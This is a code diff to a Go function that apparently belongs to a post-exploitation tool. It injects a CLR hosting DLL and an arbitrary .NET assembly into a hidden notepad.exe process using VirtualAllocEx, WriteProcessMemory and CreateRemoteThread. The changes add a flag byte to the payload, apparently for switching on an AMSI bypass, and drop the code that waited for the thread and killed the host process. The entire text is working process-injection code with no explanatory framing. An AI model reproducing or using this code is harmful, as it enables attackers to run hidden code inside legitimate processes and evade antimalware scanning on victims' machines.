@@ -10,14 +10,12 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	"strings"
 	"syscall"
-	"time"
 	"unsafe"
 )
 
 const (
-	BobLoaderOffset     = 0x00000af0
+	BobLoaderOffset     = 0x00000e00   //  0x00000af0
 	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
 	MEM_COMMIT          = 0x001000
 	MEM_RESERVE         = 0x002000
@@ -29,7 +27,6 @@ var (
 	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
-	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
 )
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
@@ -78,39 +75,29 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 	return syscall.Handle(r1), threadID, nil
 }
 
-func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
-	var exitCode uint32
-	r1, _, e1 := procGetExitCodeThread.Call(
-		uintptr(threadHandle),
-		uintptr(unsafe.Pointer(&exitCode)))
-	log.Println("r1:", r1)
-	log.Printf("Thread State: 0x%08x\n (%d)", exitCode, exitCode)
-	if r1 == 0 {
-		log.Println("r1 was zero:", e1.Error())
-		return exitCode, e1
-	}
-	return exitCode, nil
-}
-
 // ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
 // along with a provided .NET assembly to execute.
-func ExecuteAssembly(hostingDll, assembly []byte, params string) error {
-	log.Println("[*] Assembly size:", len(assembly))
-	log.Println("[*] Hosting dll size:", len(hostingDll))
-	if len(assembly) > MAX_ASSEMBLY_LENGTH {
-		return fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
-	}
+func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) error {
+	AssemblySizeArr := convertIntToByteArr(len(assembly))
+	ParamsSizeArr := convertIntToByteArr(len(params))
+	//log.Printf("[*] Assembly size        : %d \n", len(assembly))
+	//log.Printf("[*] Assembly arr   (hex) : %x \n", AssemblySizeArr)
+	//log.Printf("[*] Params size          : %d \n", len(params))
+	//log.Printf("[*] Params dll arr (hex) : %x \n", ParamsSizeArr)
+	//log.Printf("[*] Hosting dll size     : %d \n", len(hostingDll))
+
 	cmd := exec.Command("notepad.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow: true,
 	}
 	var stdoutBuf, stderrBuf bytes.Buffer
 	stdoutIn, _ := cmd.StdoutPipe()
-	stderrIn, _ := cmd.StderrPipe()
+	//stderrIn, _ := cmd.StderrPipe()
 
 	var errStdout, errStderr error
 	cmd.Start()
 	pid := cmd.Process.Pid
+
 	// OpenProcess with PROC_ACCESS_ALL
 	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
 	if err != nil {
@@ -134,42 +121,46 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) error {
 	if err != nil {
 		return err
 	}
-	// Padd arguments with 0x00 -- there must be a cleaner way to do that
-	paramsBytes := []byte(params)
-	padding := make([]byte, 1024-len(params))
-	final := append(paramsBytes, padding...)
-	// Final payload: params + assembly
-	final = append(final, assembly...)
+
+	// 4 bytes Assembly Size
+	// 4 bytes Params Size
+	// 1 byte AMSI bool  0x00 no  0x01 yes
+	// parameter bytes
+	// assembly bytes
+	payload := append(AssemblySizeArr, ParamsSizeArr...)
+	if amsi{
+		payload = append(payload, byte(1))
+	}else{
+		payload = append(payload, byte(0))
+	}
+	payload = append(payload,  []byte(params)...)
+	payload = append(payload, assembly...)
+
+	//log.Printf("[*] First nine bytes 			: %x %x %x\n", payload[:4], payload[4:8], payload[8])
+	//log.Printf("[*] Param bytes from payload   	: %x\n", payload[9:9+len(params)])
+	//log.Printf("[*] Param bytes 			   	: %x\n",[]byte(params))
+	//log.Printf("[*] Next 9 bytes of payload		: %x\n",payload[9+len(params):9+len(params)+9])
+	//log.Printf("[*] First 9 bytes of assembly 	: %x\n", assembly[:9])
+
 	// WriteProcessMemory to write the .NET assembly + args
-	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
+	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&payload[0]), uint32(len(payload)))
 	if err != nil {
 		return err
 	}
-	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
+	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
-	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
 	if err != nil {
 		return err
 	}
-	log.Println("Got thread handle:", threadHandle)
-	for {
-		code, err := getExitCodeThread(threadHandle)
-		log.Println(code)
-		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
-			log.Fatalln(err.Error())
-		}
-		if code == 259 {
-			time.Sleep(1000 * time.Millisecond)
-		} else {
-			break
-		}
-	}
-	cmd.Process.Kill()
+
 	go func() {
 		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
 	}()
-	_, errStderr = io.Copy(&stderrBuf, stderrIn)
+
+	// With this uncommented it hangs.
+//	_, errStderr = io.Copy(&stderrBuf, stderrIn)
 
 	if errStdout != nil || errStderr != nil {
 		log.Fatal("failed to capture stdout or stderr\n")
@@ -177,4 +168,17 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) error {
 	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
 	fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
 	return nil
+}
+
+func convertIntToByteArr(num int)(arr []byte){
+	// This does the same thing as the union used in the DLL to convert intValue to byte array and back
+	arr = append(arr, byte(num % 256))
+	v := num / 256
+	arr = append(arr, byte(v % 256))
+	v = v / 256
+	arr = append(arr, byte(v % 256))
+	v = v / 256
+	arr = append(arr, byte(v))
+
+	return
 }
